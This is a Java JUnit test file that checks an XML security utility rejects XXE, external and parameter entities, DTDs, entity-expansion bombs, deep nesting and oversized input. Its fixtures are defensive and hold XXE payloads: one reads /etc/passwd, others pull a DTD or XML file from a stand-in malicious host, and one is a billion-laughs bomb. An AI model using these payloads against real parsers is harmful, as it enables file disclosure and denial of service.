package com.tca.peppol.util;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.w3c.dom.Document;
import org.w3c.dom.Element;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.TransformerFactory;
import javax.xml.validation.SchemaFactory;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

import static org.assertj.core.api.Assertions.*;

/**
 * Comprehensive unit tests for XmlSecurityUtils to verify protection against
 * XXE attacks, XML bomb attacks, and other XML security vulnerabilities.
 */
@DisplayName("XmlSecurityUtils Tests")
class XmlSecurityUtilsTest {
    
    private static final String VALID_XML = """
        <?xml version="1.0" encoding="UTF-8"?>
        <root>
            <element>value</element>
        </root>
        """;
    
    private static final String XXE_ATTACK_XML = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>
            <data>&xxe;</data>
        </root>
        """;
    
    private static final String EXTERNAL_ENTITY_XML = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
            <!ENTITY external SYSTEM "http://malicious.example.com/evil.xml">
        ]>
        <root>
            <data>&external;</data>
        </root>
        """;
    
    private static final String PARAMETER_ENTITY_XML = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
            <!ENTITY % param SYSTEM "http://malicious.example.com/param.dtd">
            %param;
        ]>
        <root>
            <data>test</data>
        </root>
        """;
    
    @Nested
    @DisplayName("Secure Factory Creation Tests")
    class SecureFactoryCreationTests {
        
        @Test
        @DisplayName("Should create secure DocumentBuilderFactory with all security features enabled")
        void shouldCreateSecureDocumentBuilderFactory() throws XmlSecurityException {
            DocumentBuilderFactory factory = XmlSecurityUtils.createSecureDocumentBuilderFactory();
            
            assertThat(factory).isNotNull();
            assertThat(factory.isNamespaceAware()).isTrue();
            assertThat(factory.isValidating()).isFalse();
            assertThat(factory.isExpandEntityReferences()).isFalse();
        }
        
        @Test
        @DisplayName("Should create secure DocumentBuilder with error handler")
        void shouldCreateSecureDocumentBuilder() throws XmlSecurityException {
            DocumentBuilder builder = XmlSecurityUtils.createSecureDocumentBuilder();
            
            assertThat(builder).isNotNull();
            // Note: DocumentBuilder.getErrorHandler() is not public, so we can't directly test it
            // The error handler is tested indirectly through parsing tests
        }
        
        @Test
        @DisplayName("Should create secure TransformerFactory")
        void shouldCreateSecureTransformerFactory() throws XmlSecurityException {
            TransformerFactory factory = XmlSecurityUtils.createSecureTransformerFactory();
            
            assertThat(factory).isNotNull();
        }
        
        @Test
        @DisplayName("Should create secure SchemaFactory")
        void shouldCreateSecureSchemaFactory() throws XmlSecurityException {
            SchemaFactory factory = XmlSecurityUtils.createSecureSchemaFactory();
            
            assertThat(factory).isNotNull();
        }
    }
    
    @Nested
    @DisplayName("Valid XML Parsing Tests")
    class ValidXmlParsingTests {
        
        @Test
        @DisplayName("Should successfully parse valid XML from string")
        void shouldParseValidXmlFromString() throws XmlSecurityException {
            Document document = XmlSecurityUtils.parseSecureXml(VALID_XML);
            
            assertThat(document).isNotNull();
            assertThat(document.getDocumentElement().getTagName()).isEqualTo("root");
            
            Element element = (Element) document.getDocumentElement().getElementsByTagName("element").item(0);
            assertThat(element.getTextContent()).isEqualTo("value");
        }
        
        @Test
        @DisplayName("Should successfully parse valid XML from InputStream")
        void shouldParseValidXmlFromInputStream() throws XmlSecurityException {
            InputStream inputStream = new ByteArrayInputStream(VALID_XML.getBytes(StandardCharsets.UTF_8));
            Document document = XmlSecurityUtils.parseSecureXml(inputStream);
            
            assertThat(document).isNotNull();
            assertThat(document.getDocumentElement().getTagName()).isEqualTo("root");
        }
        
        @Test
        @DisplayName("Should parse XML with namespaces correctly")
        void shouldParseXmlWithNamespaces() throws XmlSecurityException {
            String namespacedXml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <root xmlns="http://example.com/ns" xmlns:test="http://test.com/ns">
                    <test:element>value</test:element>
                </root>
                """;
            
            Document document = XmlSecurityUtils.parseSecureXml(namespacedXml);
            
            assertThat(document).isNotNull();
            assertThat(document.getDocumentElement().getTagName()).isEqualTo("root");
        }
    }
    
    @Nested
    @DisplayName("XXE Attack Prevention Tests")
    class XxeAttackPreventionTests {
        
        @Test
        @DisplayName("Should prevent XXE attack with external file reference")
        void shouldPreventXxeAttackWithFileReference() {
            assertThatThrownBy(() -> XmlSecurityUtils.parseSecureXml(XXE_ATTACK_XML))
                .isInstanceOf(XmlSecurityException.class)
                .hasMessageContaining("XML parsing failed");
        }
        
        @Test
        @DisplayName("Should prevent XXE attack with external HTTP reference")
        void shouldPreventXxeAttackWithHttpReference() {
            assertThatThrownBy(() -> XmlSecurityUtils.parseSecureXml(EXTERNAL_ENTITY_XML))
                .isInstanceOf(XmlSecurityException.class)
                .hasMessageContaining("XML parsing failed");
        }
        
        @Test
        @DisplayName("Should prevent parameter entity attacks")
        void shouldPreventParameterEntityAttacks() {
            assertThatThrownBy(() -> XmlSecurityUtils.parseSecureXml(PARAMETER_ENTITY_XML))
                .isInstanceOf(XmlSecurityException.class)
                .hasMessageContaining("XML parsing failed");
        }
        
        @Test
        @DisplayName("Should prevent DTD processing")
        void shouldPreventDtdProcessing() {
            String dtdXml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE root [
                    <!ELEMENT root (#PCDATA)>
                ]>
                <root>test</root>
                """;
            
            assertThatThrownBy(() -> XmlSecurityUtils.parseSecureXml(dtdXml))
                .isInstanceOf(XmlSecurityException.class)
                .hasMessageContaining("XML parsing failed");
        }
    }
    
    @Nested
    @DisplayName("XML Bomb Attack Prevention Tests")
    class XmlBombAttackPreventionTests {
        
        @Test
        @DisplayName("Should prevent billion laughs attack")
        void shouldPreventBillionLaughsAttack() {
            String billionLaughsXml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE root [
                    <!ENTITY lol "lol">
                    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
                    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
                    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
                ]>
                <root>&lol4;</root>
                """;
            
            assertThatThrownBy(() -> XmlSecurityUtils.parseSecureXml(billionLaughsXml))
                .isInstanceOf(XmlSecurityException.class)
                .hasMessageContaining("XML parsing failed");
        }
        
        @Test
        @DisplayName("Should prevent quadratic blowup attack")
        void shouldPreventQuadraticBlowupAttack() {
            StringBuilder xmlBuilder = new StringBuilder();
            xmlBuilder.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
            xmlBuilder.append("<!DOCTYPE root [\n");
            xmlBuilder.append("<!ENTITY a \"");
            
            // Create a large entity
            for (int i = 0; i < 10000; i++) {
                xmlBuilder.append("a");
            }
            xmlBuilder.append("\">\n");
            xmlBuilder.append("]>\n");
            xmlBuilder.append("<root>");
            
            // Reference the entity many times
            for (int i = 0; i < 10000; i++) {
                xmlBuilder.append("&a;");
            }
            xmlBuilder.append("</root>");
            
            String quadraticBlowupXml = xmlBuilder.toString();
            
            assertThatThrownBy(() -> XmlSecurityUtils.parseSecureXml(quadraticBlowupXml))
                .isInstanceOf(XmlSecurityException.class)
                .hasMessageContaining("XML parsing failed");
        }
        
        @Test
        @DisplayName("Should prevent excessive nesting depth")
        void shouldPreventExcessiveNestingDepth() {
            StringBuilder xmlBuilder = new StringBuilder();
            xmlBuilder.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
            xmlBuilder.append("<root>");
            
            // Create deeply nested elements (more than MAX_ELEMENT_DEPTH)
            for (int i = 0; i < 150; i++) {
                xmlBuilder.append("<level").append(i).append(">");
            }
            xmlBuilder.append("content");
            for (int i = 149; i >= 0; i--) {
                xmlBuilder.append("</level").append(i).append(">");
            }
            xmlBuilder.append("</root>");
            
            String deeplyNestedXml = xmlBuilder.toString();
            
            assertThatThrownBy(() -> XmlSecurityUtils.parseSecureXml(deeplyNestedXml))
                .isInstanceOf(XmlSecurityException.class)
                .hasMessageContaining("nesting depth exceeds maximum");
        }
    }
    
    @Nested
    @DisplayName("Document Size Limit Tests")
    class DocumentSizeLimitTests {
        
        @Test
        @DisplayName("Should prevent processing of oversized documents")
        void shouldPreventOversizedDocuments() {
            StringBuilder xmlBuilder = new StringBuilder();
            xmlBuilder.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
            xmlBuilder.append("<root>");
            
            // Create a document larger than MAX_DOCUMENT_SIZE_BYTES (10MB)
            String largeContent = "x".repeat(1024); // 1KB
            for (int i = 0; i < 11000; i++) { // 11MB total
                xmlBuilder.append("<data>").append(largeContent).append("</data>");
            }
            xmlBuilder.append("</root>");
            
            String oversizedXml = xmlBuilder.toString();
            
            assertThatThrownBy(() -> XmlSecurityUtils.parseSecureXml(oversizedXml))
                .isInstanceOf(XmlSecurityException.class)
                .hasMessageContaining("document size exceeds maximum");
        }
        
        @Test
        @DisplayName("Should accept documents within size limit")
        void shouldAcceptDocumentsWithinSizeLimit() throws XmlSecurityException {
            StringBuilder xmlBuilder = new StringBuilder();
            xmlBuilder.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
            xmlBuilder.append("<root>");
            
            // Create a document within the size limit
            String content = "x".repeat(100);
            for (int i = 0; i < 100; i++) {
                xmlBuilder.append("<data>").append(content).append("</data>");
            }
            xmlBuilder.append("</root>");
            
            String validSizeXml = xmlBuilder.toString();
            
            Document document = XmlSecurityUtils.parseSecureXml(validSizeXml);
            assertThat(document).isNotNull();
        }
    }
    
    @Nested
    @DisplayName("Input Validation Tests")
    class InputValidationTests {
        
        @Test
        @DisplayName("Should reject null XML string")
        void shouldRejectNullXmlString() {
            assertThatThrownBy(() -> XmlSecurityUtils.parseSecureXml((String) null))
                .isInstanceOf(XmlSecurityException.class)
                .hasMessageContaining("cannot be null or empty");
        }
        
        @Test
        @DisplayName("Should reject empty XML string")
        void shouldRejectEmptyXmlString() {
            assertThatThrownBy(() -> XmlSecurityUtils.parseSecureXml(""))
                .isInstanceOf(XmlSecurityException.class)
                .hasMessageContaining("cannot be null or empty");
        }
        
        @Test
        @DisplayName("Should reject whitespace-only XML string")
        void shouldRejectWhitespaceOnlyXmlString() {
            assertThatThrownBy(() -> XmlSecurityUtils.parseSecureXml("   \n\t  "))
                .isInstanceOf(XmlSecurityException.class)
                .hasMessageContaining("cannot be null or empty");
        }
        
        @Test
        @DisplayName("Should reject null InputStream")
        void shouldRejectNullInputStream() {
            assertThatThrownBy(() -> XmlSecurityUtils.parseSecureXml((InputStream) null))
                .isInstanceOf(XmlSecurityException.class)
                .hasMessageContaining("cannot be null");
        }
        
        @Test
        @DisplayName("Should handle malformed XML gracefully")
        void shouldHandleMalformedXmlGracefully() {
            String malformedXml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <root>
                    <unclosed>
                </root>
                """;
            
            assertThatThrownBy(() -> XmlSecurityUtils.parseSecureXml(malformedXml))
                .isInstanceOf(XmlSecurityException.class)
                .hasMessageContaining("XML parsing failed");
        }
    }
    
    @Nested
    @DisplayName("Performance and Timeout Tests")
    class PerformanceAndTimeoutTests {
        
        @Test
        @DisplayName("Should complete parsing within reasonable time for normal documents")
        void shouldCompleteParsingWithinReasonableTime() throws XmlSecurityException {
            long startTime = System.currentTimeMillis();
            
            Document document = XmlSecurityUtils.parseSecureXml(VALID_XML);
            
            long processingTime = System.currentTimeMillis() - startTime;
            assertThat(document).isNotNull();
            assertThat(processingTime).isLessThan(1000); // Should complete within 1 second
        }
        
        @Test
        @DisplayName("Should handle complex but valid XML efficiently")
        void shouldHandleComplexValidXmlEfficiently() throws XmlSecurityException {
            StringBuilder xmlBuilder = new StringBuilder();
            xmlBuilder.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
            xmlBuilder.append("<root>");
            
            // Create a moderately complex document
            for (int i = 0; i < 1000; i++) {
                xmlBuilder.append("<item id=\"").append(i).append("\">");
                xmlBuilder.append("<name>Item ").append(i).append("</name>");
                xmlBuilder.append("<value>").append(i * 2).append("</value>");
                xmlBuilder.append("</item>");
            }
            xmlBuilder.append("</root>");
            
            String complexXml = xmlBuilder.toString();
            
            long startTime = System.currentTimeMillis();
            Document document = XmlSecurityUtils.parseSecureXml(complexXml);
            long processingTime = System.currentTimeMillis() - startTime;
            
            assertThat(document).isNotNull();
            assertThat(processingTime).isLessThan(5000); // Should complete within 5 seconds
        }
    }
}